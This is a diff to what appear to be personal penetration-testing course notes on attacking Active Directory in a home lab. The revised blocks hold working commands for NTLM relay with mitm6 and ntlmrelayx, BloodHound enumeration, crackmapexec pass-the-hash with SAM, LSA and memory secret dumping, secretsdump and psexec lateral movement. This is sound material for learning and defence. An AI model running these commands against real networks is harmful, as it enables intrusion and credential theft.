@@ -34,6 +34,13 @@ I recommend using this script to build the AD environment. This ensures that the
 
   * Objects - user, groups, contacts, computers, etc.; everything inside a domain.
 
+* **Types of accounts:**
+
+  * built-in administrator
+  * local administrator
+  * Active Directory administrator
+  * Active Directory user (can be local administrator)
+
 ## Attacking Active Directory: Initial Attack Vectors
 
 * [This article](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa) covers some common ways to attack active directory computers and get domain admin.
@@ -177,7 +184,7 @@ I recommend using this script to build the AD environment. This ensures that the
   mitm6 -d marvel.local
 
   #setup relay
-  ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
+  ntlmrelayx.py -6 -t ldaps://dc.ip -wh fakewpad.marvel.local -l lootme
   #generate activity on Windows machine by rebooting it
   #this dumps info in another directory
 
@@ -260,12 +267,13 @@ I recommend using this script to build the AD environment. This ensures that the
 
   ```shell
   sudo neo4j console
-  #localhost:7687 - default creds: neo4j:neo4j
+  #localhost:7687 - default creds: neo4j:neo4j -> changed to neo4j1
 
   sudo bloodhound
 
   sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns dc.ip -c all
-  #run injestor
+  #run ingestor - this wasnt working for me so I installed it from the github repo and used:
+  python3 Bloodhound.py/bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns dc.ip -c all
   ```
 
   * This zip file can be imported in BloodHound. We can use Pre-Built Analytics Queries to plan further.
@@ -280,21 +288,43 @@ I recommend using this script to build the AD environment. This ensures that the
   #attempts to gain access via pass the password
   #can also spray passwords
 
-  crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --same
+  crackmapexec smb 192.168.57.0/24 -u administrator -H <hash> --local-auth
+  #attempts to pass the hash and authenticate as LOCAL ADMIN, it can be useful if the hash cannot be cracked, but with this it is possible to dump secrets
+
+  crackmapexec smb 192.168.57.0/24 -u administrator -H <hash> --local-auth --sam
   #attempts to dump SAM files
 
-  psexec.py marvel/fcastle:Password1@192.168.57.142
-  #use creds from crackmapexec to gain access to other machine
+  crackmapexec smb 192.168.57.0/24 -u administrator -H <hash> --local-auth --shares
+  #enumerate shares on the machines
+  
+  crackmapexec smb 192.168.57.0/24 -u administrator -H <hash> --local-auth --lsa
+  #dump the lsa (secrets for users who have already loggen in once before), but it is not guaranteed that the cracked password is still valid
+  #cracked passwords can be used for password spraying
+  
+  crackmapexec smb 192.168.57.0/24 -u administrator -H <hash> --local-auth -M lsassy
+  #dump secrets in memory
+
+  cmedb
+  #crackmapexec database
 
   secretsdump.py marvel/fcastle:Password1@192.168.57.141
+  secretsdump.py administrator:@192.168.57.141 --hashes NTLM_hash
   #silent alternative to hashdump in meterpreter
   #dumps SAM hashes
 
   #the NTLM hashes can be cracked using Hashcat
   #if we cannot crack hashes, we can pass the hashes (only NTLM, not NTLMv2)
+  ```
+  ![](../images/passthehash.png)
+  - Keep in mind: 
+    - NTLMv1 hashes can be passed around, NTLMv2 hashes can be only relayed
+    - sprayed = pass
 
-  crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
-  #attempts to pass the hash
+- To gain access and shell with passwords and hashes found:
+
+  ```
+  psexec.py marvel/fcastle:Password1@192.168.57.142
+  #use creds from crackmapexec to gain access to other machine
 
   psexec.py "Frank Castle":@192.168.57.141 -hashes <complete NTLM hash>
   #alt pass the hash method
